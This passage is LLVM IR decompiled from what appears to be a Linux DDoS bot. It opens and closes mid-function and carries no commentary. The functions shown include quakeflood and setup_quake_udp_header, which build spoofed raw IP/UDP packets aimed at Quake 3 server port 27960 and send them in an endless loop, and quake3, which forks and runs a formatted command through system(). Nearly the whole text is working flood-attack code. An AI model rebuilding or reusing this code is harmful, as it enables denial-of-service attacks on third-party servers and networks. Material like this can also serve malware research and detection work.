  %v6_804c7ac = inttoptr i32 %v5_804c7ac to i32*
  store i32 %v4_804c765, i32* %v6_804c7ac, align 4
  %v1_804c7af = call i32 @close(i32 %v1_804c566)
  store i32 %v1_804c7af, i32* %eax.global-to-local, align 4
  %v0_804c7b4 = load i32, i32* @esp, align 4
  %v2_804c7b4 = icmp ugt i32 %v0_804c7b4, -17
  store i1 %v2_804c7b4, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804c7b7

dec_label_pc_804c7b7:                             ; preds = %dec_label_pc_804c75c, %dec_label_pc_804c776
  %v0_804c7bd.in = phi i32 [ %v0_804c76a, %dec_label_pc_804c75c ], [ %v0_804c7b4, %dec_label_pc_804c776 ]
  %stack_var_-104.1 = phi i32 [ %stack_var_-104.0, %dec_label_pc_804c75c ], [ %v1_804c566, %dec_label_pc_804c776 ]
  %v0_804c7bd = add i32 %v0_804c7bd.in, 16
  %v9_804c7b7 = icmp ult i32 %stack_var_-52.0, 99
  store i1 %v9_804c7b7, i1* %cf.global-to-local, align 1
  %v7_804c7bb = icmp sgt i32 %stack_var_-52.0, 99
  br i1 %v7_804c7bb, label %dec_label_pc_804c7bd, label %dec_label_pc_804c7dd

dec_label_pc_804c7bd:                             ; preds = %dec_label_pc_804c7b7
  %v5_804c7bd = icmp ult i32 %v0_804c7bd, 12
  store i1 %v5_804c7bd, i1* %cf.global-to-local, align 1
  %v2_804c7c0 = inttoptr i32 %v0_804c7bd.in to i32*
  store i32 0, i32* %v2_804c7c0, align 4
  %v1_804c7c2 = inttoptr i32 %stack_var_-104.1 to i32*
  %v2_804c7c2 = call i32 @__GI_time(i32* %v1_804c7c2)
  %v0_804c7c7 = load i32, i32* @esp, align 4
  %v1_804c7c7 = add i32 %v0_804c7c7, 16
  store i32 %v2_804c7c2, i32* %edx.global-to-local, align 4
  store i32 %v5_804c7cf, i32* %eax.global-to-local, align 4
  %v7_804c7d2 = icmp ult i32 %v2_804c7c2, %v5_804c7cf
  store i1 %v7_804c7d2, i1* %cf.global-to-local, align 1
  %v1_804c7d4 = icmp eq i1 %v7_804c7d2, false
  br i1 %v1_804c7d4, label %dec_label_pc_804c7e5, label %dec_label_pc_804c7dd

dec_label_pc_804c7dd:                             ; preds = %dec_label_pc_804c7bd, %dec_label_pc_804c7b7
  %v0_804c6e617 = phi i32 [ %v0_804c7bd, %dec_label_pc_804c7b7 ], [ %v1_804c7c7, %dec_label_pc_804c7bd ]
  %stack_var_-52.1 = phi i32 [ %stack_var_-52.0, %dec_label_pc_804c7b7 ], [ 0, %dec_label_pc_804c7bd ]
  %v4_804c7dd = add i32 %stack_var_-52.1, 1
  br label %dec_label_pc_804c6e0

dec_label_pc_804c7e5:                             ; preds = %dec_label_pc_804c7bd
  %v5_804c7e5 = icmp ult i32 %v1_804c7c7, 12
  store i1 %v5_804c7e5, i1* %cf.global-to-local, align 1
  %v6_804c7e8 = inttoptr i32 %v0_804c7c7 to i32*
  store i32 %v4_804c765, i32* %v6_804c7e8, align 4
  %v1_804c7eb = call i32 @close(i32 %stack_var_-52.0)
  store i32 %v1_804c7eb, i32* %eax.global-to-local, align 4
  %v0_804c7f0 = load i32, i32* @esp, align 4
  %v1_804c7f0 = add i32 %v0_804c7f0, 16
  %v5_804c7f3 = icmp ult i32 %v1_804c7f0, 12
  store i1 %v5_804c7f3, i1* %cf.global-to-local, align 1
  %v2_804c7f6 = inttoptr i32 %v0_804c7f0 to i32*
  store i32 0, i32* %v2_804c7f6, align 4
  %v1_804c7f8 = call i32 @__GI_exit(i32 %stack_var_-52.0)
  store i32 %v1_804c7f8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c7fd

dec_label_pc_804c7fd:                             ; preds = %dec_label_pc_804c548, %dec_label_pc_804c7e5
  %v0_804c803 = phi i32 [ %v1_804c54e, %dec_label_pc_804c548 ], [ %v1_804c7f8, %dec_label_pc_804c7e5 ]
  ret i32 %v0_804c803

; uselistorder directives
  uselistorder i32 %stack_var_-104.1, { 1, 0 }
  uselistorder i32 %v0_804c734.sink, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804c74a, { 1, 2, 0 }
  uselistorder i32 %v0_804c725, { 1, 2, 0 }
  uselistorder i16 %stack_var_-70.2, { 2, 0, 1 }
  uselistorder i32 %v0_804c741, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v1_804c704, { 1, 0 }
  uselistorder i32 %v1_804c6fb, { 1, 0 }
  uselistorder i32 %stack_var_-52.0, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_804c6e6, { 0, 3, 2, 1 }
  uselistorder i32 %v1_804c695, { 1, 0 }
  uselistorder i1 %v5_804c663, { 1, 0 }
  uselistorder i1 %v0_804c5ea, { 1, 0 }
  uselistorder i32* %v1_804c5cb, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804c5c8, { 1, 0, 2, 3, 4 }
  uselistorder i1 %v0_804c5ab, { 1, 0 }
  uselistorder i32* %v1_804c58c, { 1, 0, 2 }
  uselistorder i32 %v1_804c589, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804c566, { 1, 2, 3, 4, 6, 7, 0, 5, 8, 9 }
  uselistorder i32 %v4_804c522, { 1, 0 }
  uselistorder i1 %v5_804c512, { 0, 1, 2, 5, 3, 4, 6 }
  uselistorder i32* %stack_var_-108, { 0, 2, 1, 3, 4 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i32 (i32, i32)* @host2ip, { 3, 2, 1, 0 }
  uselistorder i8** @global_var_80698dd.176, { 1, 0 }
  uselistorder i32 65507, { 2, 0, 1 }
  uselistorder i32 %arg4, { 5, 4, 2, 3, 0, 1 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804c7fd, { 1, 0 }
  uselistorder label %dec_label_pc_804c7b7, { 1, 0 }
  uselistorder label %dec_label_pc_804c75c, { 1, 0 }
  uselistorder label %dec_label_pc_804c710, { 1, 0 }
  uselistorder label %dec_label_pc_804c6b5, { 1, 0 }
  uselistorder label %dec_label_pc_804c618, { 1, 0 }
  uselistorder label %dec_label_pc_804c548, { 1, 0 }
}

define i32 @setup_ip_header(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804c804 = load i32, i32* @ebp, align 4
  store i32 %v0_804c804, i32* %stack_var_-4, align 4
  %v4_804c80a = ptrtoint i8* %arg1 to i32
  store i8 69, i8* %arg1, align 1
  %v1_804c827 = add i32 %v4_804c80a, 1
  %v2_804c827 = inttoptr i32 %v1_804c827 to i8*
  store i8 0, i8* %v2_804c827, align 1
  %v1_804c82e = add i32 %v4_804c80a, 2
  %v2_804c82e = inttoptr i32 %v1_804c82e to i16*
  store i16 42, i16* %v2_804c82e, align 2
  %v2_804c83c = call i32 @htonl(i32 54321)
  %v3_804c83c = trunc i32 %v2_804c83c to i16
  %sext = mul i32 %v2_804c83c, 65536
  %v1_804c844 = sdiv i32 %sext, 65536
  store i32 %v1_804c844, i32* @edx, align 4
  %v3_804c849 = add i32 %v4_804c80a, 4
  %v4_804c849 = inttoptr i32 %v3_804c849 to i16*
  store i16 %v3_804c83c, i16* %v4_804c849, align 2
  %v1_804c850 = add i32 %v4_804c80a, 6
  %v2_804c850 = inttoptr i32 %v1_804c850 to i16*
  store i16 0, i16* %v2_804c850, align 2
  %v1_804c859 = add i32 %v4_804c80a, 8
  %v2_804c859 = inttoptr i32 %v1_804c859 to i8*
  store i8 -1, i8* %v2_804c859, align 1
  %v1_804c860 = add i32 %v4_804c80a, 9
  %v2_804c860 = inttoptr i32 %v1_804c860 to i8*
  store i8 17, i8* %v2_804c860, align 1
  %v1_804c867 = add i32 %v4_804c80a, 10
  %v2_804c867 = inttoptr i32 %v1_804c867 to i16*
  store i16 0, i16* %v2_804c867, align 2
  %v2_804c875 = call i32 @inet_addr(i32 ptrtoint ([14 x i8]* @global_var_8069065.83 to i32))
  %v3_804c882 = add i32 %v4_804c80a, 12
  %v4_804c882 = inttoptr i32 %v3_804c882 to i32*
  store i32 %v2_804c875, i32* %v4_804c882, align 4
  %v2_804c885 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804c885, i32* @ebp, align 4
  ret i32 %v4_804c80a
}

define i32 @setup_quake_udp_header(i16* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v1_804c895 = call i32 @htons(i32 5678)
  %v2_804c895 = trunc i32 %v1_804c895 to i16
  %v4_804c89f = ptrtoint i16* %arg1 to i32
  store i32 %v4_804c89f, i32* %eax.global-to-local, align 4
  store i16 %v2_804c895, i16* %arg1, align 2
  %v1_804c8ad = call i32 @htons(i32 27960)
  %v2_804c8ad = trunc i32 %v1_804c8ad to i16
  %v3_804c8ba = add i32 %v4_804c89f, 2
  %v4_804c8ba = inttoptr i32 %v3_804c8ba to i16*
  store i16 %v2_804c8ad, i16* %v4_804c8ba, align 2
  %v1_804c8c1 = add i32 %v4_804c89f, 6
  %v2_804c8c1 = inttoptr i32 %v1_804c8c1 to i16*
  store i16 0, i16* %v2_804c8c1, align 2
  %v1_804c8ca = add i32 %v4_804c89f, 8
  store i32 %v1_804c8ca, i32* %eax.global-to-local, align 4
  %v1_804c8cd = inttoptr i32 %v1_804c8ca to i32*
  store i32 -1, i32* %v1_804c8cd, align 4
  %v0_804c8d3 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c8d3 = add i32 %v0_804c8d3, 4
  %v2_804c8d3 = inttoptr i32 %v1_804c8d3 to i32*
  store i32 1937007975, i32* %v2_804c8d3, align 4
  %v0_804c8da = load i32, i32* %eax.global-to-local, align 4
  %v1_804c8da = add i32 %v0_804c8da, 8
  %v2_804c8da = inttoptr i32 %v1_804c8da to i32*
  store i32 1970561396, i32* %v2_804c8da, align 4
  %v0_804c8e1 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c8e1 = add i32 %v0_804c8e1, 12
  %v2_804c8e1 = inttoptr i32 %v1_804c8e1 to i16*
  store i16 2675, i16* %v2_804c8e1, align 2
  %v1_804c8ec = call i32 @htons(i32 22)
  %v2_804c8ec = trunc i32 %v1_804c8ec to i16
  store i32 %v4_804c89f, i32* %eax.global-to-local, align 4
  %v4_804c8f9 = add i32 %v4_804c89f, 4
  %v5_804c8f9 = inttoptr i32 %v4_804c8f9 to i16*
  store i16 %v2_804c8ec, i16* %v5_804c8f9, align 2
  ret i32 %v4_804c89f

; uselistorder directives
  uselistorder i32 %v4_804c89f, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i16* %arg1, { 1, 0 }
}

define i32 @quakeflood(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8240 = alloca i32, align 4
  %stack_var_-8220 = alloca i32, align 4
  %v2_804c90e = ptrtoint i32* %stack_var_-8220 to i32
  %v1_804c91a = add i32 %v2_804c90e, 20
  %v5_804c91d = inttoptr i32 %v1_804c91a to i16*
  %v1_804c92c = add i32 %arg1, 12
  %v2_804c92c = inttoptr i32 %v1_804c92c to i32*
  %v3_804c92c = load i32, i32* %v2_804c92c, align 4
  %v1_804c94a = add i32 %arg1, 4
  %v2_804c94a = inttoptr i32 %v1_804c94a to i32*
  %v3_804c94a = load i32, i32* %v2_804c94a, align 4
  %v4_804c959 = call i32 @socket(i32 2, i32 3, i32 6)
  %v5_804c964 = icmp slt i32 %v4_804c959, 0
  %v1_804c968 = icmp eq i1 %v5_804c964, false
  br i1 %v1_804c968, label %entry.dec_label_pc_804c98b_crit_edge, label %dec_label_pc_804c96a

entry.dec_label_pc_804c98b_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804c98b

dec_label_pc_804c96a:                             ; preds = %entry
  %v0_804c96a = load i8*, i8** @global_var_8073d70, align 4
  %v1_804c96a = ptrtoint i8* %v0_804c96a to i32
  %v6_804c979 = call i32 @fwrite(i32 ptrtoint ([28 x i8]* @global_var_80691f8.94 to i32), i32 1, i32 27, i32 %v1_804c96a)
  %v2_804c986 = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_804c98b

dec_label_pc_804c98b:                             ; preds = %entry.dec_label_pc_804c98b_crit_edge, %dec_label_pc_804c96a
  %v3_804c990 = call i32 @__GI_time(i32* null)
  %v2_804c999 = call i32 @init_rand(i32 %v3_804c990)
  %tmp39 = bitcast i32* %stack_var_-8220 to i8*
  %v5_804c9b2 = call i32 @__GI_memset(i8* %tmp39, i32 0, i32 8192)
  store i32 %v5_804c9b2, i32* @eax, align 4
  %v3_804c9c0 = call i32 @setup_ip_header(i8* %tmp39)
  %v3_804c9ce = call i32 @setup_quake_udp_header(i16* %v5_804c91d)
  %v0_804c9d6 = call i32 @random()
  %v2_804c9e6 = ashr i32 %v0_804c9d6, 31
  %v2_804c9e9 = zext i32 %v0_804c9d6 to i64
  %v4_804c9e9 = zext i32 %v2_804c9e6 to i64
  %v5_804c9e9 = mul nuw i64 %v4_804c9e9, 4294967296
  %v6_804c9e9 = or i64 %v5_804c9e9, %v2_804c9e9
  %v10_804c9e9 = srem i64 %v6_804c9e9, 64509
  %v11_804c9e9 = trunc i64 %v10_804c9e9 to i32
  %v1_804c9ed = add i32 %v11_804c9e9, 1026
  %v1_804c9f2 = urem i32 %v1_804c9ed, 65536
  %v2_804c9fb = call i32 @htons(i32 %v1_804c9f2)
  %v3_804c9fb = trunc i32 %v2_804c9fb to i16
  store i16 %v3_804c9fb, i16* %v5_804c91d, align 4
  %v2_804ca14 = add i32 %v2_804c90e, 12
  %v3_804ca14 = inttoptr i32 %v2_804ca14 to i32*
  store i32 %v3_804c92c, i32* %v3_804ca14, align 4
  %v1_804ca1a = add i32 %v3_804c94a, 4
  %v2_804ca1a = inttoptr i32 %v1_804ca1a to i32*
  %v3_804ca1a = load i32, i32* %v2_804ca1a, align 4
  %v2_804ca20 = add i32 %v2_804c90e, 16
  %v3_804ca20 = inttoptr i32 %v2_804ca20 to i32*
  store i32 %v3_804ca1a, i32* %v3_804ca20, align 4
  %v1_804ca26 = or i32 %v2_804c90e, 2
  %v2_804ca26 = inttoptr i32 %v1_804ca26 to i16*
  %v3_804ca26 = load i16, i16* %v2_804ca26, align 2
  %v3_804ca2a = udiv i16 %v3_804ca26, 2
  %v9_804ca2a = zext i16 %v3_804ca2a to i32
  %v3_804ca3a = bitcast i32* %stack_var_-8220 to i16*
  %v4_804ca3a = call i32 @csum(i16* %v3_804ca3a, i32 %v9_804ca2a)
  %v5_804ca3a = trunc i32 %v4_804ca3a to i16
  %v3_804ca47 = add i32 %v2_804c90e, 10
  %v4_804ca47 = inttoptr i32 %v3_804ca47 to i16*
  store i16 %v5_804ca3a, i16* %v4_804ca47, align 2
  store i32 1, i32* %stack_var_-8240, align 4
  %v2_804ca55 = ptrtoint i32* %stack_var_-8240 to i32
  %v6_804ca6d = call i32 @__GI_setsockopt(i32 %v4_804c959, i32 0, i32 3, i32 %v2_804ca55, i32 4)
  %v2_804ca75 = icmp slt i32 %v6_804ca6d, 0
  %v1_804ca77 = icmp eq i1 %v2_804ca75, false
  br i1 %v1_804ca77, label %dec_label_pc_804ca9a, label %dec_label_pc_804ca79

dec_label_pc_804ca79:                             ; preds = %dec_label_pc_804c98b
  %v0_804ca79 = load i8*, i8** @global_var_8073d70, align 4
  %v1_804ca79 = ptrtoint i8* %v0_804ca79 to i32
  %v6_804ca88 = call i32 @fwrite(i32 ptrtoint ([43 x i8]* @global_var_8069214.95 to i32), i32 1, i32 42, i32 %v1_804ca79)
  %v2_804ca95 = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_804ca9a

dec_label_pc_804ca9a:                             ; preds = %dec_label_pc_804c98b, %dec_label_pc_804ca79
  %v3_804ca9f = call i32 @__GI_time(i32* null)
  %v2_804caa8 = call i32 @init_rand(i32 %v3_804ca9f)
  %v3_804cb11 = add i32 %v2_804c90e, 4
  %v4_804cb11 = inttoptr i32 %v3_804cb11 to i16*
  br label %dec_label_pc_804caba

dec_label_pc_804caba:                             ; preds = %dec_label_pc_804cb70, %dec_label_pc_804ca9a
  %stack_var_-16.0 = phi i32 [ %v3_804c94a, %dec_label_pc_804ca9a ], [ %v3_804cae9, %dec_label_pc_804cb70 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_804ca9a ], [ %v4_804cb70, %dec_label_pc_804cb70 ]
  %v3_804cac2 = load i16, i16* %v2_804ca26, align 2
  %v4_804cac2 = zext i16 %v3_804cac2 to i32
  %v7_804cade = call i32 @sendto(i32 %v4_804c959, i32 %v2_804c90e, i32 %v4_804cac2, i32 0, i32 %stack_var_-16.0, i32 16)
  %v1_804cae9 = add i32 %stack_var_-16.0, 16
  %v2_804cae9 = inttoptr i32 %v1_804cae9 to i32*
  %v3_804cae9 = load i32, i32* %v2_804cae9, align 4
  %v1_804caf2 = add i32 %v3_804cae9, 4
  %v2_804caf2 = inttoptr i32 %v1_804caf2 to i32*
  %v3_804caf2 = load i32, i32* %v2_804caf2, align 4
  store i32 %v3_804caf2, i32* %v3_804ca20, align 4
  %v1_804cafb = call i32 @rand_cmwc(i32 %v3_804cae9)
  %v2_804cb04 = call i32 @htonl(i32 %v1_804cafb)
  %v3_804cb04 = trunc i32 %v2_804cb04 to i16
  store i16 %v3_804cb04, i16* %v4_804cb11, align 4
  %v3_804cb18 = load i16, i16* %v2_804ca26, align 2
  %v3_804cb1c = udiv i16 %v3_804cb18, 2
  %v9_804cb1c = zext i16 %v3_804cb1c to i32
  %v4_804cb2c = call i32 @csum(i16* %v3_804ca3a, i32 %v9_804cb1c)
  %v5_804cb2c = trunc i32 %v4_804cb2c to i16
  store i16 %v5_804cb2c, i16* %v4_804ca47, align 2
  %v0_804cb3d = load i64, i64* @global_var_807cc80.96, align 8
  %v1_804cb3d = trunc i64 %v0_804cb3d to i32
  %v1_804cb42 = add i32 %v1_804cb3d, 1
  %v1_804cb43 = sext i32 %v1_804cb42 to i64
  store i64 %v1_804cb43, i64* @global_var_807cc80.96, align 128
  %v0_804cb48 = load i32, i32* @global_var_807cb68.97, align 8
  %v6_804cb53 = icmp ugt i32 %v0_804cb48, %storemerge
  br i1 %v6_804cb53, label %dec_label_pc_804caba.dec_label_pc_804cb70_crit_edge, label %dec_label_pc_804cb55

dec_label_pc_804caba.dec_label_pc_804cb70_crit_edge: ; preds = %dec_label_pc_804caba
  br label %dec_label_pc_804cb70

dec_label_pc_804cb55:                             ; preds = %dec_label_pc_804caba
  %v0_804cb5f = load i32, i32* @global_var_806f718.98, align 8
  %v2_804cb68 = sext i32 %v0_804cb5f to i64
  %v3_804cb68 = call i32 @usleep(i64 %v2_804cb68)
  br label %dec_label_pc_804cb70

dec_label_pc_804cb70:                             ; preds = %dec_label_pc_804caba.dec_label_pc_804cb70_crit_edge, %dec_label_pc_804cb55
  %stack_var_-8248.0 = phi i32 [ %storemerge, %dec_label_pc_804caba.dec_label_pc_804cb70_crit_edge ], [ 0, %dec_label_pc_804cb55 ]
  %v4_804cb70 = add i32 %stack_var_-8248.0, 1
  br label %dec_label_pc_804caba

; uselistorder directives
  uselistorder i32 %v3_804cae9, { 1, 2, 0 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v2_804c90e, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %stack_var_-8240, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804cb70, { 1, 0 }
  uselistorder label %dec_label_pc_804ca9a, { 1, 0 }
  uselistorder label %dec_label_pc_804c98b, { 1, 0 }
}

define i32 @quake3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-576 = alloca i32, align 4
  %stack_var_-636 = alloca i32, align 4
  %stack_var_-620 = alloca i32, align 4
  %v15_804cb81 = ptrtoint i32* %stack_var_-620 to i32
  store i32 %v15_804cb81, i32* @eax, align 4
  store i32 %arg2, i32* %stack_var_-636, align 4
  %v7_804cb92 = ptrtoint i32* %stack_var_-636 to i32
  %v1_804cb95 = call i32 @mfork(i32 %arg2)
  store i32 %v1_804cb95, i32* %eax.global-to-local, align 4
  %v1_804cb9d = icmp eq i32 %v1_804cb95, 0
  br i1 %v1_804cb9d, label %dec_label_pc_804cba6, label %dec_label_pc_804d0ff

dec_label_pc_804cba6:                             ; preds = %entry
  store i32 2, i32* %stack_var_-636, align 4
  %v3_804cbb2 = call i32 @socket(i32 2, i32 3, i32 255)
  store i32 %v3_804cbb2, i32* %eax.global-to-local, align 4
  %v5_804cbbd = icmp slt i32 %v3_804cbb2, 0
  %v1_804cbc1 = icmp eq i1 %v5_804cbbd, false
  br i1 %v1_804cbc1, label %dec_label_pc_804cbcd, label %dec_label_pc_804cbc3

dec_label_pc_804cbc3:                             ; preds = %dec_label_pc_804cba6
  store i32 1, i32* %stack_var_-636, align 4
  %v1_804cbc8 = call i32 @__GI_exit(i32 1)
  store i32 %v1_804cbc8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cbcd

dec_label_pc_804cbcd:                             ; preds = %dec_label_pc_804cba6, %dec_label_pc_804cbc3
  %v4_804cbcd = add i32 %arg3, -5
  %v9_804cbcd = sub i32 4, %arg3
  %v10_804cbcd = and i32 %v9_804cbcd, %arg3
  %v11_804cbcd = icmp slt i32 %v10_804cbcd, 0
  %v12_804cbcd = icmp eq i32 %v4_804cbcd, 0
  %v13_804cbcd = icmp slt i32 %v4_804cbcd, 0
  %v3_804cbd1 = icmp eq i1 %v13_804cbcd, %v11_804cbcd
  %v4_804cbd1 = icmp eq i1 %v12_804cbcd, false
  %v5_804cbd1 = and i1 %v4_804cbd1, %v3_804cbd1
  br i1 %v5_804cbd1, label %dec_label_pc_804cbcd.dec_label_pc_804cbf3_crit_edge, label %dec_label_pc_804cbd3

dec_label_pc_804cbcd.dec_label_pc_804cbf3_crit_edge: ; preds = %dec_label_pc_804cbcd
  br label %dec_label_pc_804cbf3

dec_label_pc_804cbd3:                             ; preds = %dec_label_pc_804cbcd
  %v3_804cbe1 = call i32 @Send(i32 %arg1, i32 ptrtoint ([115 x i8]* @global_var_806991c.179 to i32))
  store i32 %v3_804cbe1, i32* %eax.global-to-local, align 4
  %v2_804cbee = call i32 @__GI_exit(i32 -1)
  store i32 %v2_804cbee, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cbf3

dec_label_pc_804cbf3:                             ; preds = %dec_label_pc_804cbcd.dec_label_pc_804cbf3_crit_edge, %dec_label_pc_804cbd3
  %v3_804cbf8 = call i32 @__GI_time(i32* null)
  store i32 %v3_804cbf8, i32* %eax.global-to-local, align 4
  %v2_804cc04 = call i32 @srand(i32 %v3_804cbf8)
  store i32 0, i32* @global_var_807dca0.85, align 32
  %v0_804cc1d = load i8*, i8** @global_var_8073d6c, align 4
  %v1_804cc1d = ptrtoint i8* %v0_804cc1d to i32
  store i32 %v1_804cc1d, i32* %eax.global-to-local, align 4
  %v6_804cc2c = call i32 @fwrite(i32 ptrtoint ([23 x i8]* @global_var_806932a.101 to i32), i32 1, i32 22, i32 %v1_804cc1d)
  store i32 128, i32* %eax.global-to-local, align 4
  %v2_804cc42 = call i32 @malloc(i32 128)
  store i32 128, i32* %eax.global-to-local, align 4
  %v8_804cc56 = inttoptr i32 %v2_804cc42 to i8*
  %v5_804cc59 = call i32 @__GI_memset(i8* %v8_804cc56, i32 0, i32 128)
  %v1_804cc67 = add i32 %arg4, 16
  store i32 %v1_804cc67, i32* %eax.global-to-local, align 4
  %v1_804cc6a = inttoptr i32 %v1_804cc67 to i32*
  %v2_804cc6a = load i32, i32* %v1_804cc6a, align 4
  store i32 %v2_804cc6a, i32* %eax.global-to-local, align 4
  %v2_804cc70 = call i32 @atol(i32 %v2_804cc6a)
  %v1_804cc7e = add i32 %arg4, 20
  store i32 %v1_804cc7e, i32* %eax.global-to-local, align 4
  %v1_804cc81 = inttoptr i32 %v1_804cc7e to i32*
  %v2_804cc81 = load i32, i32* %v1_804cc81, align 4
  store i32 %v2_804cc81, i32* %eax.global-to-local, align 4
  %v2_804cc87 = call i32 @atol(i32 %v2_804cc81)
  store i32 0, i32* @global_var_807cb68.97, align 8
  store i64 0, i64* @global_var_807cc80.96, align 128
  %v1_804ccb0 = add i32 %arg4, 12
  store i32 %v1_804ccb0, i32* %eax.global-to-local, align 4
  %v1_804ccb3 = inttoptr i32 %v1_804ccb0 to i32*
  %v2_804ccb3 = load i32, i32* %v1_804ccb3, align 4
  store i32 %v2_804ccb3, i32* %edx.global-to-local, align 4
  store i32 %v1_804ccb0, i32* %eax.global-to-local, align 4
  %v2_804ccbb = load i32, i32* %v1_804ccb3, align 4
  store i32 %v2_804ccbb, i32* %ecx.global-to-local, align 4
  store i32 %v1_804ccb0, i32* %eax.global-to-local, align 4
  %v2_804ccc3 = load i32, i32* %v1_804ccb3, align 4
  store i32 %v2_804ccc3, i32* @ebx, align 4
  store i32 %v1_804ccb0, i32* %eax.global-to-local, align 4
  %v2_804cccb = load i32, i32* %v1_804ccb3, align 4
  store i32 %v2_804cccb, i32* %eax.global-to-local, align 4
  %v2_804cccd = ptrtoint i32* %stack_var_-576 to i32
  store i32 %v2_804cccd, i32* @esi, align 4
  %v3_804cce0 = call i32 @sprintf(i32 %v2_804cccd, i32 ptrtoint ([139 x i8]* @global_var_8069990.180 to i32))
  store i32 %v2_804cccd, i32* %eax.global-to-local, align 4
  %v2_804ccf2 = call i32 @system(i32 %v2_804cccd)
  store i32 %v2_804ccf2, i32* @eax, align 4
  %v3_804cd07 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_8069a1b.181 to i32), i32 ptrtoint ([2 x i8]* @global_var_806915a.88 to i32))
  store i32 %v3_804cd07, i32* %eax.global-to-local, align 4
  %v8_804ce76 = inttoptr i32 %v5_804cc59 to i8*
  %v1_804cd25 = and i32 %v5_804cc59, -256
  %v5_804cd89 = add i32 %v5_804cc59, -1
  br label %dec_label_pc_804ce6d.outer

dec_label_pc_804cd17:                             ; preds = %dec_label_pc_804ce6d
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %v1_804cd25, i32* %eax.global-to-local, align 4
  %v3_804cd2e = call i32 @_strlen(i8* %v8_804ce76)
  %v4_804cd2e = mul i32 %v3_804cd2e, -1
  %v5_804cd2e = add i32 %v4_804cd2e, -2
  store i32 %v5_804cd2e, i32* %ecx.global-to-local, align 4
  %v5_804cd35 = sub i32 %v5_804cc59, %v4_804cd2e
  %v1_804cd38 = add i32 %v5_804cd35, -1
  store i32 %v1_804cd38, i32* %eax.global-to-local, align 4
  %v1_804cd39 = inttoptr i32 %v1_804cd38 to i8*
  %v2_804cd39 = load i8, i8* %v1_804cd39, align 1
  %v3_804cd39 = zext i8 %v2_804cd39 to i32
  %v5_804cd39 = and i32 %v1_804cd38, -256
  %v6_804cd39 = or i32 %v3_804cd39, %v5_804cd39
  store i32 %v6_804cd39, i32* %eax.global-to-local, align 4
  %v10_804cd3b = icmp eq i8 %v2_804cd39, 10
  br i1 %v10_804cd3b, label %dec_label_pc_804cd6b, label %dec_label_pc_804cd3f

dec_label_pc_804cd3f:                             ; preds = %dec_label_pc_804cd17
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %v1_804cd25, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v5_804cc59, i32* @edi, align 4
  %v3_804cd56 = call i32 @_strlen(i8* %v8_804ce76)
  %v4_804cd56 = mul i32 %v3_804cd56, -1
  %v5_804cd56 = add i32 %v4_804cd56, -2
  store i32 %v5_804cd56, i32* @ecx, align 4
  %v5_804cd5d = sub i32 %v5_804cc59, %v4_804cd56
  %v1_804cd60 = add i32 %v5_804cd5d, -1
  store i32 %v1_804cd60, i32* %eax.global-to-local, align 4
  %v1_804cd61 = inttoptr i32 %v1_804cd60 to i8*
  %v2_804cd61 = load i8, i8* %v1_804cd61, align 1
  %v3_804cd61 = zext i8 %v2_804cd61 to i32
  %v5_804cd61 = and i32 %v1_804cd60, -256
  %v6_804cd61 = or i32 %v3_804cd61, %v5_804cd61
  store i32 %v6_804cd61, i32* %eax.global-to-local, align 4
  %v10_804cd63 = icmp eq i8 %v2_804cd61, 13
  %v1_804cd65 = icmp eq i1 %v10_804cd63, false
  br i1 %v1_804cd65, label %dec_label_pc_804ce6d, label %dec_label_pc_804cd6b

dec_label_pc_804cd6b:                             ; preds = %dec_label_pc_804cd3f, %dec_label_pc_804cd17
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %v1_804cd25, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v5_804cc59, i32* @edi, align 4
  %v3_804cd82 = call i32 @_strlen(i8* %v8_804ce76)
  %v4_804cd82 = mul i32 %v3_804cd82, -1
  %v5_804cd82 = add i32 %v4_804cd82, -2
  store i32 %v5_804cd82, i32* @ecx, align 4
  %v1_804cd8c = sub i32 %v5_804cd89, %v4_804cd82
  %v1_804cd8d = inttoptr i32 %v1_804cd8c to i8*
  store i8 0, i8* %v1_804cd8d, align 1
  %v0_804cd90 = load i32, i32* @global_var_807dca0.85, align 32
  store i32 %v0_804cd90, i32* %eax.global-to-local, align 4
  %v1_804cd95 = icmp eq i32 %v0_804cd90, 0
